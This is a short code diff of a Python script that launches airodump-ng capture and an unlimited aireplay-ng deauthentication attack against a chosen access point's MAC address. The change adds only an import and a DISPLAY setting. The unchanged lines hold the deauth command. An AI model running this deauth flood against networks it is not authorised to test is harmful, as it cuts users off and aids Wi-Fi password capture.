@@ -1,6 +1,7 @@
 import subprocess
 import time
 import re
+import os
 
 def get_interface():
     interface = input("Enter the network interface (e.g., wlan0, wlo1): ")
@@ -58,6 +59,7 @@ def start_monitoring_tools(network_info, interface):
     aireplay_cmd = f"gnome-terminal -- aireplay-ng -0 0 -a {mac_address} {interface}"
     
     # Start the commands in separate terminals
+    os.environ['DISPLAY'] = ':0'
     subprocess.Popen(['gnome-terminal', '--', 'bash', '-c', airodump_cmd])
     subprocess.Popen(['gnome-terminal', '--', 'bash', '-c', aireplay_cmd])
     
